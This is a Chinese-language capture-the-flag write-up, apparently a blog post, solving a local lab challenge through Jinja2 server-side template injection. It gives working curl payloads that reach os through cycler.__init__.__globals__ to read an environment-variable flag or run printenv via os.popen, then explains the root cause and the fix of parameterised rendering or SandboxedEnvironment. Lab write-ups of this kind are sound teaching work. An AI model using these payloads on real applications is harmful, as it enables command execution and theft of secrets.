---
title: range-v1 第 2 题：Jinja2 SSTI 读环境变量
date: 2026-11-28 11:05:00
author: Xendr1a
categories: [CTF题解, range-v1]
tags: [range-v1, SSTI, Writeup]
description: 私人靶场链 range-v1 第 2 题：裸 Jinja2 的模板注入，沿 cycler.__init__.__globals__ 拿 os 读 FLAG。
toc: true
---
## 环境

`python:3.12-slim` + `jinja2==3.1.4`，compose 起在 `127.0.0.1:12002`。flag 走运行时环境变量注入，app 自己不碰 flag。

题目用的是**裸 jinja2**，没有 Flask，所以 `{{config}}` 这类 Flask 专有对象不成立，payload 得走 `cycler`。

## 指纹

先确认模板被渲染：

```bash
curl -s --get --data-urlencode 'name={{7*7}}' http://127.0.0.1:12002/hello
# 你好，49！
```

## 打通

默认 `Environment` 不是沙箱，`cycler`、`lipsum` 这些全局对象都在。顺着 `__init__.__globals__` 就能摸到 `os`：

```bash
curl -s --get --data-urlencode 'name={{cycler.__init__.__globals__.os.environ.get("FLAG")}}' \
     http://127.0.0.1:12002/hello
# 你好，flag{range_v1_r2-ssti}！
```

等价写法，走 `popen`：

```bash
{{cycler.__init__.__globals__.os.popen("printenv FLAG").read()}}
```

## 复盘

漏洞点两处叠加：用户输入直接拼进 `from_string` 的模板源码，加上用的是 `Environment` 而不是 `SandboxedEnvironment`。

GZCTF 部署时变量名是 `GZCTF_FLAG`，payload 里把 `FLAG` 换掉即可。

修的话很简单：模板永远参数化渲染（`render(name=name)`），确实需要动态模板就用 `SandboxedEnvironment`。

这个靶场到"读 env"为止，引号/下划线过滤绕过、`|attr` 链、内存马那些留给链外，不在这题的射程里。
